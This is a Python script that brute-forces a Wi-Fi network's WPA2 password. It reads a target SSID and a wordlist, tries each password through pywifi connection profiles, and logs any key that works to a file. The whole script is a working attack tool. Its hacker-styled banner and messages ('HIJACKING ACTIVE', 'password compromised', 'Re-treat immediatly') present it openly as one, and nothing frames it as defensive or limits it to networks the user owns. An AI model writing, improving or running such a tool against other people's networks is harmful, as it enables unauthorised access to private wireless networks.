import pywifi
from pywifi import const
import time
import sys
import os
from colorama import Fore, Back, Style, init

# Initialize Colorama with Autoreset to prevent color bleeding
init(autoreset=True)

def typewriter(text, color_style, speed=0.05):
    """Creates a slow-typing effect for dramatic hacker warnings."""
    for char in text:
        sys.stdout.write(color_style + char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    # High-contrast Cyberpunk Banner
    banner = rf"""
{Fore.CYAN}{Style.BRIGHT}  __      __.__  ___________.__    .__                   __                 
 /  \    /  \__| \_   _____/|__|   |  |__ _____    ____ |  | __ ___________ 
 \   \/\/   /  |  |    __)  |  |   |  |  \\__  \ _/ ___\|  |/ // __ \_  __ \
  \        /|  |  |     \   |  |   |   Y  \/ __ \\  \___|    <\  ___/|  | \/
   \__/\  / |__|  \___  /   |__|   |___|  (____  /\___  >__|_ \\___  >__|   
        \/            \/                \/     \/     \/     \/    \/       
    """
    print(banner)
    print(f"{Fore.RED}{Back.BLACK}{Style.BRIGHT} [!] SYSTEM: ENCRYPTED {Fore.WHITE}| {Fore.YELLOW}STATUS: HIJACKING ACTIVE {Fore.RED}[!] ")
    print(f"{Fore.CYAN}{'='*75}\n")

def test_wifi(iface, ssid, password, timeout):
    """Handles the hardware handshake and sync logic."""
    iface.disconnect()
    time.sleep(0.5)
    
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    # Hardware Sync Loop: Checks status every 0.5s to prevent skipping
    start_time = time.time()
    while time.time() - start_time < timeout:
        if iface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(0.5)
    
    return False

def main():
    try:
        show_banner()
        
        # 1. Inputs with Bright Cyan Styling
        ssid = input(f"{Fore.CYAN}{Style.BRIGHT}1. enter ssid (essid) of network: {Fore.WHITE}")
        wordlist_path = input(f"{Fore.CYAN}{Style.BRIGHT}2. path to wordlist: {Fore.WHITE}")
        try:
            delay = float(input(f"{Fore.CYAN}{Style.BRIGHT}3. delay per attempt (seconds): {Fore.WHITE}"))
        except:
            delay = 5.0 # Safe default for most WiFi cards

        # Initialize Wireless Interface
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0] 

        if not os.path.exists(wordlist_path):
            print(f"\n{Fore.RED}{Back.WHITE} [!] CRITICAL ERROR: WORDLIST NOT FOUND ")
            return

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        total = len(passwords)
        print(f"\n{Fore.GREEN}[+] TARGET ACQUIRED: {Fore.WHITE}{ssid}")
        print(f"{Fore.GREEN}[+] INJECTING {total} KEYS... {Fore.RED}DO NOT INTERRUPT\n")

        for i, pwd in enumerate(passwords, 1):
            # Dynamic testing line with Dim effect on the password
            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
            sys.stdout.flush()

            if test_wifi(iface, ssid, pwd, delay):
                # SUCCESS SEQUENCE
                print(f"\n\n{Fore.GREEN}{Style.BRIGHT}Sucess! :({pwd})")
                
                # Typewriter Effects for the Final Warning
                typewriter("password compromised !!!", Fore.RED + Style.BRIGHT, 0.08)
                typewriter("Re-treat immediatly", Fore.RED + Style.BRIGHT, 0.08)
                
                # Auto-Logging Result
                with open("cracked_passwords.txt", "a") as log:
                    log.write(f"DATE: {time.ctime()} | SSID: {ssid} | KEY: {pwd}\n")
                return
            
        print(f"\n\n{Fore.RED}[!] Wordlist exhausted. Target remains secure.")

    except KeyboardInterrupt:
        # Your custom exit message
        print(f"\n\n{Fore.RED}{Style.BRIGHT}hacker gone{Style.RESET_ALL}")
        sys.exit()

if __name__ == "__main__":
    main()
